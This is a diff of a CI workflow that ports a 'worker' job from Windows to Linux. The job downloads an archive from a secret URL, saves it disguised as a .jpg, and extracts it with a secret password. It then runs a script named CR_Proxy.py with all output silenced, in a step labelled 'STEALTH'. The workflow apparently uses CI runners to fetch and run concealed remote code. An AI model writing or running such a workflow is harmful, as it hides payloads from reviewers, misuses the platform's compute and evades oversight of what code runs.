@@ -1,4 +1,4 @@
-name: Windows Worker
+name: Linux Worker
 
 on:
   workflow_dispatch:
@@ -11,7 +11,7 @@ concurrency:
 
 jobs:
   worker:
-    runs-on: windows-latest
+    runs-on: ubuntu-latest
     timeout-minutes: 90
 
     steps:
@@ -23,32 +23,25 @@ jobs:
           python-version: "3.10"
 
       - name: Prepare dependencies (silent)
-        shell: powershell
         run: |
-          choco install 7zip -y --no-progress > $null
+          sudo apt-get update -y > /dev/null 2>&1
+          sudo apt-get install -y p7zip-full > /dev/null 2>&1
 
       - name: Download model (jpg disguised)
-        shell: powershell
         env:
           MODEL_URL: ${{ secrets.LINK }}
         run: |
-          $ProgressPreference = 'SilentlyContinue'
-          Invoke-WebRequest -Uri "$Env:MODEL_URL" -OutFile "model.jpg" > $null
+          curl -L "$MODEL_URL" -o model.jpg > /dev/null 2>&1
 
       - name: Rename & extract model
-        shell: powershell
         env:
           ARCHIVE_KEY: ${{ secrets.PASSWORD }}
         run: |
-          Rename-Item model.jpg model.7z
-          & "C:\Program Files\7-Zip\7z.exe" x model.7z -p"$Env:ARCHIVE_KEY" -oextracted -y > $null
+          mv model.jpg model.7z
+          7z x model.7z -p"$ARCHIVE_KEY" -oextracted -y > /dev/null 2>&1
 
       - name: Run CR_Proxy.py (STEALTH)
-        shell: powershell
         run: |
-          $ErrorActionPreference = 'SilentlyContinue'
-
-          $main = Get-ChildItem extracted -Recurse -Filter CR_Proxy.py | Select-Object -First 1
-          if (-not $main) { exit 0 }
-
-          cmd /c "python `"$($main.FullName)`" > nul 2>&1"
+          main=$(find extracted -type f -name "CR_Proxy.py" | head -n 1)
+          if [ -z "$main" ]; then exit 0; fi
+          python "$main" > /dev/null 2>&1
